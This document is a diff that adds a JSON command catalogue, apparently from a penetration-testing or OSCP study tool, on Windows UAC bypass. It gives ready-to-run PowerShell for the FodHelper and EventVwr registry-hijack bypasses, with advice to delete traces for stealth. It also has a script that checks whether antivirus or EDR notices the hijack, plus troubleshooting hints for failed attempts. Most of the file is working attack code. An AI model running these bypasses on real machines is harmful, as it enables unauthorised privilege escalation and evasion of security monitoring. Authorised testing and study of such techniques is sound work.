@@ -1,0 +1,132 @@
+{
+  "category": "UAC Bypass",
+  "description": "User Account Control (UAC) bypass techniques for privilege escalation. Exploits auto-elevation of trusted Windows binaries via registry hijacking and DLL abuse.",
+  "commands": [
+    {
+      "id": "fodhelper-uac-bypass",
+      "name": "FodHelper UAC Bypass",
+      "description": "Exploit fodhelper.exe auto-elevation via registry hijacking. Creates HKCU registry key that fodhelper.exe checks, executes payload with high integrity without UAC prompt.",
+      "category": "uac-bypass",
+      "tags": [
+        "anti-virus",
+        "AV",
+        "evasion",
+        "uac-bypass",
+        "privilege-escalation",
+        "windows",
+        "registry"
+      ],
+      "command": "# Create registry structure\nNew-Item \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Force\nNew-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"(default)\" -Value \"<PAYLOAD_COMMAND>\" -Force\n\n# Trigger UAC bypass\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\" -WindowStyle Hidden\n\n# Cleanup\nStart-Sleep -Seconds 3\nRemove-Item \"HKCU:\\Software\\Classes\\ms-settings\\\" -Recurse -Force",
+      "variables": [
+        {
+          "name": "<PAYLOAD_COMMAND>",
+          "description": "Command to execute with high integrity (admin)",
+          "example": "cmd /c start powershell.exe",
+          "required": true
+        }
+      ],
+      "prerequisites": [],
+      "notes": "Syntax:\nExecute in PowerShell with medium integrity (standard user) FodHelper is classic UAC bypass for Windows 10.\n\nWorks on unpatched systems.\n\nQuick to execute (~10 sec).\n\nAlways clean up registry key for stealth.\n\nTest integrity with 'whoami /groups' before and after.\n\nUseful after initial access to escalate without credentials.\n\nTime estimate:\n2 minutes References:\ndocs/av-evasion/uac-bypass.md#fodhelper, PEN-300 Chapter 7.5 Manual alternative:\nUse alternate UAC bypasses (eventvwr, sdclt, computerdefaults), exploit vulnerabilities, or request legitimate admin credentials",
+      "success_indicators": [
+        "Payload executes with high integrity (admin) without UAC prompt. No console window appears if configured properly."
+      ],
+      "failure_indicators": [
+        "Payload doesn't execute - Increase sleep time before cleanup",
+        "UAC prompt appears - Fodhelper patched or monitored by EDR",
+        "Registry key persists - Cleanup failed, manually delete HKCU\\Software\\Classes\\ms-settings",
+        "No elevation - User is not in Administrators group",
+        "Fodhelper.exe not found - Windows 10+ required"
+      ]
+    },
+    {
+      "id": "eventvwr-uac-bypass",
+      "name": "EventVwr UAC Bypass",
+      "description": "Exploit eventvwr.exe auto-elevation via registry hijacking. Similar to FodHelper but uses different registry key (mscfile). Works on Windows 7-10.",
+      "category": "uac-bypass",
+      "tags": [
+        "anti-virus",
+        "AV",
+        "evasion",
+        "uac-bypass",
+        "privilege-escalation",
+        "windows",
+        "registry"
+      ],
+      "command": "# Create registry key\nNew-Item \"HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"<PAYLOAD_COMMAND>\" -Force\n\n# Trigger UAC bypass\nStart-Process \"C:\\Windows\\System32\\eventvwr.exe\" -WindowStyle Hidden\n\n# Cleanup\nStart-Sleep -Seconds 3\nRemove-Item \"HKCU:\\Software\\Classes\\mscfile\\\" -Recurse -Force",
+      "variables": [
+        {
+          "name": "<PAYLOAD_COMMAND>",
+          "description": "Command to execute with high integrity",
+          "example": "cmd /c start powershell.exe",
+          "required": true
+        }
+      ],
+      "notes": "Syntax:\nExecute in PowerShell with medium integrity EventVwr is older bypass, may be patched.\n\nFodHelper more reliable on modern systems.\n\nGood backup option.\n\nWorks on Windows 7-10.\n\n~5 sec execution time.\n\nTime estimate:\n2 minutes References:\ndocs/av-evasion/uac-bypass.md#eventvwr Manual alternative:\nUse FodHelper, sdclt, computerdefaults, or other auto-elevate binaries",
+      "success_indicators": [
+        "EventVwr opens, payload executes with high integrity. Event Viewer may appear briefly."
+      ],
+      "failure_indicators": [
+        "Event Viewer stays open - Normal, close manually or programmatically",
+        "Patched on newer Windows - Try FodHelper instead",
+        "Registry key lingers - Cleanup failed"
+      ]
+    },
+    {
+      "id": "check-integrity-level",
+      "name": "Check Process Integrity Level",
+      "description": "Verify current process integrity level (Low/Medium/High/System). Determines if UAC bypass needed and validates bypass success.",
+      "category": "uac-bypass",
+      "tags": [
+        "anti-virus",
+        "AV",
+        "evasion",
+        "uac-bypass",
+        "privilege-escalation",
+        "windows",
+        "enumeration"
+      ],
+      "command": "whoami /groups | findstr /i \"Mandatory Label\"",
+      "variables": [],
+      "notes": "Syntax:\nRun in cmd.exe or PowerShell Always check integrity before attempting UAC bypass.\n\nMedium + Administrators group = UAC bypass will work.\n\nLow integrity = sandboxed process, escape first.\n\nHigh = already elevated, no bypass needed.\n\nTakes <5 sec to check.\n\nTime estimate:\n10 seconds References:\ndocs/av-evasion/uac-bypass.md#integrity-levels Manual alternative:\nUse PowerShell [Security.Principal.WindowsIdentity]::GetCurrent(), Process Explorer, or Task Manager Details pane",
+      "success_indicators": [
+        "Low: Mandatory Label\\Low Mandatory Level\nMedium: Mandatory Label\\Medium Mandatory Level\nHigh: Mandatory Label\\High Mandatory Level\nSystem: Mandatory Label\\System Mandatory Level"
+      ],
+      "failure_indicators": [
+        "Command not recognized - Old Windows version, use alternative methods",
+        "No output - User not in Administrators group (UAC bypass won't elevate)",
+        "Confused with UAC vs integrity - Medium + Admin group = UAC bypass possible"
+      ]
+    },
+    {
+      "id": "uac-bypass-detection",
+      "name": "Test UAC Bypass Detection",
+      "description": "Test if UAC bypass attempt is detected/blocked by AV or EDR. Creates registry keys without triggering bypass to check for alerts.",
+      "category": "uac-bypass",
+      "tags": [
+        "anti-virus",
+        "AV",
+        "evasion",
+        "uac-bypass",
+        "testing",
+        "windows"
+      ],
+      "command": "# Test registry creation (no trigger)\nNew-Item \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Force\nNew-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"(default)\" -Value \"cmd /c echo test\" -Force\n\nWrite-Host \"Registry keys created. Check for AV alerts...\"\nStart-Sleep 10\n\n# Cleanup\nRemove-Item \"HKCU:\\Software\\Classes\\ms-settings\\\" -Recurse -Force\nWrite-Host \"Cleaned up. No AV alert = bypass likely undetected.\"",
+      "variables": [],
+      "notes": "Syntax:\nExecute in PowerShell to test detection Test before using in real engagement.\n\nSome EDR products specifically monitor HKCU\\Software\\Classes hijacking.\n\nIf detected, try alternate bypasses (sdclt, computerdefaults) or token manipulation.\n\n~30 sec test time.\n\nTime estimate:\n30 seconds References:\ndocs/av-evasion/uac-bypass.md#testing Manual alternative:\nMonitor Windows Event Logs (Security, Sysmon), check EDR console, or use Process Monitor to watch registry access",
+      "success_indicators": [
+        "No AV alert = Bypass likely undetected. AV alert = Need alternate method or additional evasion."
+      ],
+      "failure_indicators": [
+        "False negative - Some AV only alerts on trigger, not registry creation",
+        "Test file not created - Bypass blocked or path permissions issue"
+      ]
+    }
+  ],
+  "oscp_relevance": "Essential for privilege escalation when you have user credentials but need admin rights. UAC bypass avoids asking for password. Common in Active Directory environments where user is local admin.",
+  "attack_chain_position": "Privilege Escalation, Post-Exploitation",
+  "related_categories": [
+    "privilege-escalation",
+    "windows",
+    "registry"
+  ]
+}
